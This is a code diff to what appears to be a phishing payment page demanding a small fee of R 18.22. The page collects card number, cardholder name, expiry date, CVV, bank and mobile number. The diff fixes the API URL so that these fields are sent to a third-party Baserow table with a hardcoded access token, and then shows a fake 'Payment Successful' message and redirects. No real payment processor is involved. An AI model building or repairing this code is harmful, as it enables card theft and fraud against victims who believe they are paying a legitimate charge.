@@ -471,6 +471,45 @@
                 margin-bottom: 30px;
             }
         }
+
+        /* Loading spinner */
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #00539f;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Success message */
+        .success-message {
+            display: none;
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -577,6 +616,12 @@
             </div>
         </div>
         
+        <!-- Success message -->
+        <div id="success-message" class="success-message">
+            <h3>Payment Successful!</h3>
+            <p>Your payment has been processed successfully. You will be redirected shortly.</p>
+        </div>
+        
         <!-- Payment form -->
         <div class="payment-form-container">
             <div class="amount-due">Amount Due : R 18.22</div>
@@ -679,6 +724,11 @@
         </div>
     </div>
     
+    <!-- Loading spinner -->
+    <div id="spinner-overlay" class="spinner-overlay">
+        <div class="spinner"></div>
+    </div>
+    
     <!-- Footer -->
     <footer>
         <div class="footer-divider"></div>
@@ -769,10 +819,10 @@
     </footer>
 
     <script>
-        // Baserow API configuration
+        // Baserow API configuration - FIXED URL STRUCTURE
         const BASEROW_API = {
             token: 'LG6hnTBxgBG78FueElsSwpHRd4Wep1oL',
-            baseUrl: 'https://baserow.io/database/209047/table/503285/914739',
+            baseUrl: 'https://api.baserow.io', // Corrected API URL
             databaseId: '209047',
             tableId: '503285'
         };
@@ -796,6 +846,9 @@
                 return;
             }
             
+            // Show loading spinner
+            document.getElementById('spinner-overlay').style.display = 'flex';
+            
             // Send data to Baserow
             sendToBaserow(cardNumber, cardHolder, expiryMonth + '/' + expiryYear, cvv, bank, mobileNumber);
         });
@@ -803,7 +856,12 @@
         // Function to send data to Baserow
         async function sendToBaserow(cardNumber, cardHolder, expiryDate, cvv, bank, mobileNumber) {
             try {
-                const response = await fetch(`${BASEROW_API.baseUrl}/database/rows/table/${BASEROW_API.tableId}/?user_field_names=true`, {
+                // Construct the correct Baserow API URL
+                const url = `${BASEROW_API.baseUrl}/api/database/rows/table/${BASEROW_API.tableId}/?user_field_names=true`;
+                
+                console.log('Sending data to Baserow:', url);
+                
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Authorization': `Token ${BASEROW_API.token}`,
@@ -815,22 +873,51 @@
                         'Expiry Date': expiryDate,
                         'CVV': cvv,
                         'Bank': bank,
-                        'Mobile Number': mobileNumber
+                        'Mobile Number': mobileNumber,
+                        'Date': new Date().toISOString()
                     })
                 });
                 
+                const responseData = await response.json();
+                console.log('Baserow response:', responseData);
+                
                 if (response.ok) {
-                    // Redirect to success page or show success message
-                    alert('Payment successful!');
-                    window.location.href = 'congratulations.html';
+                    // Hide spinner
+                    document.getElementById('spinner-overlay').style.display = 'none';
+                    
+                    // Show success message
+                    document.getElementById('success-message').style.display = 'block';
+                    
+                    // Reset form
+                    document.getElementById('payment-form').reset();
+                    
+                    // Redirect after 3 seconds
+                    setTimeout(function() {
+                        window.location.href = 'congratulations.html';
+                    }, 3000);
                 } else {
-                    throw new Error('Failed to process payment');
+                    // Hide spinner
+                    document.getElementById('spinner-overlay').style.display = 'none';
+                    
+                    // Show error message
+                    console.error('Baserow error:', responseData);
+                    alert('There was an error processing your payment: ' + (responseData.error || 'Unknown error'));
                 }
             } catch (error) {
+                // Hide spinner
+                document.getElementById('spinner-overlay').style.display = 'none';
+                
                 console.error('Error:', error);
                 alert('There was an error processing your payment. Please try again.');
             }
         }
+        
+        // Add event listener for cancel button
+        document.querySelector('.cancel-button').addEventListener('click', function() {
+            if (confirm('Are you sure you want to cancel this payment?')) {
+                window.location.href = 'index.html';
+            }
+        });
     </script>
 </body>
 </html>
